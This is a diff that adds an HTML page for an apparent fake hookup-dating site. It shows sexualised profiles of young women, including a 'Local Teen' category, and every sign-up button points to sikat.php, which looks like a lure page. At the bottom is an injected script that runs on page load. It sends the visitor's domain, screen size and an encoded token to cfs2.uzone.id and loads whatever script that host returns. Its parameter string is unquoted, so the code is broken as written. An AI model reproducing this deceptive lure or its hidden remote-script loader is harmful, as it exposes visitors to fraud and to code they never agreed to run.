@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <title>Online Dating</title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <link rel="stylesheet" href="https://rawgit.com/debraaa10/webcam/master/main.css">
+    <style type="text/css">
+        body{
+            background-color: black;
+            font-size: 20px;
+        }
+        .st-content {
+          overflow-y: scroll;
+         background: white;
+        }
+        #dislike {
+    display: inline-block;
+    margin-right: 20px;
+    background: url(https://rawgit.com/debraaa10/webcam/master/dislike.png) 0 0/100%;
+    background-image: url(https://rawgit.com/debraaa10/webcam/master/dislike.png);
+    background-position-x: 0px;
+    background-position-y: 0px;
+    background-size: 100%;
+    background-repeat-x: initial;
+    background-repeat-y: initial;
+    background-attachment: initial;
+    background-origin: initial;
+    background-clip: initial;
+    background-color: initial;
+    width: 110px;
+    height: 110px;
+}
+       #like {
+    display: inline-block;
+    margin-right: 20px;
+    background: url(https://rawgit.com/debraaa10/webcam/master/like.png) 0 0/100%;
+    background-image: url(https://rawgit.com/debraaa10/webcam/master/like.png);
+    background-position-x: 0px;
+    background-position-y: 0px;
+    background-size: 100%;
+    background-repeat-x: initial;
+    background-repeat-y: initial;
+    background-attachment: initial;
+    background-origin: initial;
+    background-clip: initial;
+    background-color: initial;
+    width: 110px;
+    height: 110px;
+}
+    </style>
+  </head>
+  <body>
+    <div id="match">
+        <div id="matchInner">
+            <h2>Send Her a Message</h2>
+            <p>Hookup Tonight &amp; Get Laid!</p>
+            <div id="pPix"></div>
+            <a href="sikat.php" class="out">
+                <div id="profileBtn">Create Free Profile</div>
+            </a>
+            <div id="PlayBtn">Keep Browsing</div>
+        </div>
+    </div>
+    <!--/match-->
+
+    <div id="viewProfile">
+        <div id="viewInner">
+            <h2>Wanna See More Girls?</h2>
+            <p>Create Your Profile and Start chatting today!</p>
+            <div id="pPix1"></div>
+            <a href="sikat.php" class="out">
+                <div id="profileBtn">Create Free Profile</div>
+            </a>
+        </div>
+    </div>
+    <!--/match-->
+
+    <div id="st-container" class="st-container">
+         <div id="setting">
+            <nav id="menuLeft">
+                <h2>Setting</h2>
+                <ul>
+                    <li rel="n">
+                        <img src="https://rawgit.com/debraaa10/webcam/master/teen.png">Local Teen</li>
+                    <li rel="a">
+                        <img src="https://rawgit.com/debraaa10/webcam/master/asian.png">Hot Asians</li>
+                    <li rel="l">
+                        <img src="https://rawgit.com/debraaa10/webcam/master/latin.png">Latins</li>
+                    <li rel="m">
+                        <img src="https://rawgit.com/debraaa10/webcam/master/milf.png">Milfs</li>
+                    <li rel="b">
+                        <img src="https://rawgit.com/debraaa10/webcam/master/blk.png">Ebony</li>
+                </ul>
+            </nav>
+        </div>
+        <div id="chat">
+            <nav class="st-menu st-effect-3" id="menu-4">
+                <h2>Match</h2>
+                <ul>
+                    <li><a href="#">View her message</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+        <!-- content push wrapper -->
+        <div class="st-pusher">
+            <div class="st-content">
+                <!-- this is the wrapper for the content -->
+                <div class="st-content-inner">
+                    <div id="st-trigger-effects" class="codrops-top clearfix">
+                        
+                        <img id="logo" src="https://rawgit.com/debraaa10/webcam/master/newlogo_app.png">
+                        <button id="chatBtn" class="right">
+                            <img src="https://rawgit.com/debraaa10/webcam/master/chat.png">
+                        </button>
+                    </div>
+                    <div class="main clearfix">
+                        <div id="Profiles">
+                        
+                            <div class="profileWrapper animated orig" style="z-index:5">
+                                <div id="profilePix">
+                                    <a class="viewP"><img src="https://rawgit.com/debraaa10/webcam/master/1.jpg"></a>
+                                    <div id="info">
+                                        <h2>Emily, 21</h2><span>4<img src="https://rawgit.com/debraaa10/webcam/master/camera.png"></span>
+                                    </div>
+                                </div>
+                                <div id="desc">
+                                    <div id="status">
+                                        <img src="https://rawgit.com/debraaa10/webcam/master/status.png"> Single
+                                    </div>
+                                    <div id="geo">
+                                        <img src="https://rawgit.com/debraaa10/webcam/master/pin.png"> Near you
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="profileWrapper animated orig" style="z-index:4">
+                                <div id="profilePix">
+                                    <a class="viewP"><img src="https://rawgit.com/debraaa10/webcam/master/2.jpg"></a>
+                                    <div id="info">
+                                        <h2>Juile, 23</h2><span>3<img src="https://rawgit.com/debraaa10/webcam/master/camera.png"></span>
+                                    </div>
+                                </div>
+                                <div id="desc">
+                                    <div id="status">
+                                        <img src="https://rawgit.com/debraaa10/webcam/master/status.png"> Single
+                                    </div>
+                                    <div id="geo">
+                                        <img src="https://rawgit.com/debraaa10/webcam/master/pin.png"> Near you
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="profileWrapper animated orig" style="z-index:3">
+                                <div id="profilePix">
+                                    <a class="viewP"><img src="https://rawgit.com/debraaa10/webcam/master/3.jpg"></a>
+                                    <div id="info">
+                                        <h2>Samantha, 19</h2><span>2<img src="https://rawgit.com/debraaa10/webcam/master/camera.png"></span>
+                                    </div>
+                                </div>
+                                <div id="desc">
+                                    <div id="status">
+                                        <img src="https://rawgit.com/debraaa10/webcam/master/status.png"> Single
+                                    </div>
+                                    <div id="geo">
+                                        <img src="https://rawgit.com/debraaa10/webcam/master/pin.png"> Near you
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="profileWrapper animated orig" style="z-index:2">
+                                <div id="profilePix">
+                                    <a class="viewP"><img src="https://rawgit.com/debraaa10/webcam/master/4.jpg"></a>
+                                    <div id="info">
+                                        <h2>Katy, 23</h2><span>5<img src="https://rawgit.com/debraaa10/webcam/master/camera.png"></span>
+                                    </div>
+                                </div>
+                                <div id="desc">
+                                    <div id="status">
+                                        <img src="https://rawgit.com/debraaa10/webcam/master/status.png"> Single
+                                    </div>
+                                    <div id="geo">
+                                        <img src="https://rawgit.com/debraaa10/webcam/master/pin.png"> Near you
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="profileWrapper animated orig" style="z-index:1">
+                                <div id="profilePix">
+                                    <a class="viewP"><img src="https://rawgit.com/debraaa10/webcam/master/5.jpg"></a>
+                                    <div id="info">
+                                        <h2>Katy, 23</h2><span>5<img src="https://rawgit.com/debraaa10/webcam/master/camera.png"></span>
+                                    </div>
+                                </div>
+                                <div id="desc">
+                                    <div id="status">
+                                        <img src="https://rawgit.com/debraaa10/webcam/master/status.png"> Single
+                                    </div>
+                                    <div id="geo">
+                                        <img src="https://rawgit.com/debraaa10/webcam/master/pin.png"> Near you
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <img id="stackImg" src="https://rawgit.com/debraaa10/webcam/master/images.jpg">
+                        <div id="btns">
+                            <div id="dislike"></div>
+                            <div id="like"></div>
+                        </div>
+                    </div>
+                    <!-- /main -->
+                </div>
+                <!-- /st-content-inner -->
+            </div>
+            <!-- /st-content -->
+        </div>
+        <!-- /st-pusher -->
+    </div>
+    <!-- /st-container -->
+
+
+    <script src="https://rawgit.com/debraaa10/webcam/master/vendor.js"></script>
+
+        <script src="https://rawgit.com/debraaa10/webcam/master/main.js"></script>
+
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + 4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKZyTwiCNd9w%2fG9XT219yEKwONaVM2K1oXOH%2f%2bnnvAIcqLkv7WH88WKQmgyE1hhcy0bI0A77dCYshRHJJwiU77P6QsWme%2bOMO0rqflAXPOmQQHpuvWX55QkNDEabFyPTCJbIG2XiNFJHPUAStiHIhmDRhAuNQLwbslYMCdUSSsDvM4GKf3A7ypt3ZwJ6T2IW%2f9sEP%2fSNCKiA6NthPjxT6z6RoNJaggfzwGC2vqDvTCkJX4%2bcUpa1OuiayqBHGljZfJ9p5bZHllWdpe%2fP3zIMy0p39T7mGSyWohte25gPLsPjRx39qpn6AO0AFBx0kCtgqeALajgOdgIq8Qujw%2f1xDUQ1ytvo8hUQc00hN7tAe6HTFcEgP6P9reR6JbP6DwCsAr8GvpwJPVeNEEegkhETGTrprbGJT0d66mdfJrE6ODnh3Iktx3Ra8Wd34DUXLtq24Rfjb5LZqdDBJhBr%2beZAwE7wxWdp%2fnyONRoSwEsJ%2bK41XGMiT5pgKMto9nro6LaUZz6UnQv6pAF7e1CV4IqB9XVHIOSHJHvYRvt%2b7qJkUeZTQ%3d + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body></html>
